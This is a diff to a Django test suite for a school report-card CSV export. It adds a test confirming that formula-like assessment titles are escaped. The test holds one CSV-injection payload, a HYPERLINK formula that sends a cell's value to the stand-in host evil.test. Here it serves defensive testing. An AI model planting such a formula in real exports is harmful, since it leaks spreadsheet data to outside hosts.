@@ -1,4 +1,6 @@
 """Smoke tests dos endpoints /api/v1/boletins/aluno/{id}/."""
+import csv
+import io
 from datetime import date
 from decimal import Decimal
 from unittest.mock import patch
@@ -239,6 +241,40 @@ class BoletimAvaliacoesEndpointTests(TestCase):
             kwargs={"aluno_id": aluno_id},
         )
         return f"{base}?{query}" if query else base
+
+    def test_titulo_com_formula_sai_como_texto(self):
+        """`titulo` é texto livre do professor e a escola abre no Excel.
+
+        Ver `apps/common/planilha.py`: uma célula iniciada em `=` é
+        avaliada como fórmula ao abrir o arquivo.
+        """
+        formula = '=HYPERLINK("http://evil.test?v="&A1,"Clique")'
+        avaliacao = Avaliacao.objects.create(
+            escola=self.escola,
+            turma=self.turma,
+            disciplina=self.disciplina,
+            titulo=formula,
+            data=date(2026, 4, 10),
+            nota_maxima=Decimal("10"),
+            peso=Decimal("1"),
+        )
+        # O export lista uma linha por NotaAvaliacao, não por Avaliacao
+        # (ver `listar_avaliacoes_do_aluno`), então a nota precisa existir
+        # — mesmo sem valor lançado.
+        NotaAvaliacao.objects.create(
+            escola=self.escola, avaliacao=avaliacao, aluno=self.aluno,
+        )
+        resp = self.client.get(self._url(self.aluno.id))
+        self.assertEqual(resp.status_code, 200)
+        celulas = [
+            celula
+            for linha in csv.reader(
+                io.StringIO(resp.content.decode("utf-8"))
+            )
+            for celula in linha
+        ]
+        self.assertIn(f"'{formula}", celulas)
+        self.assertNotIn(formula, celulas)
 
     def test_csv_default_retorna_arquivo_com_headers_certos(self):
         resp = self.client.get(self._url(self.aluno.id))
